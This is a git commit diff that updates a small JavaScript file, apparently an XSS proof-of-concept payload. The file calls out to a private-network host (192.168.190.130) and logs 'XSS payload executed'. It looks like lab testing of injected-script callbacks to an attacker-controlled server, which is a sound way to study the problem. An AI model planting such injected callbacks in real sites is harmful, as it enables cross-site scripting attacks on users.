c9587a0b77856b18771306a2e15664ba529e952f
Crow <74257119+InfoSec-Crow@users.noreply.github.com>
2022-10-27 10:28:48 +0200

    Update xssurl2.js

--- xssurl2.js
+++ xssurl2.js
@@ -1,9 +1,10 @@
-function xssPayload() {
-  fetch('http://192.168.190.130/')
-  .then((response) => response.json())
-  .then((data) => console.log(data));
-
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
 }
 
-console.log('XSS payload executed');
-xssPayload();
+console.log('XSS payload executed 123');
+httpGet('http://192.168.190.130/');
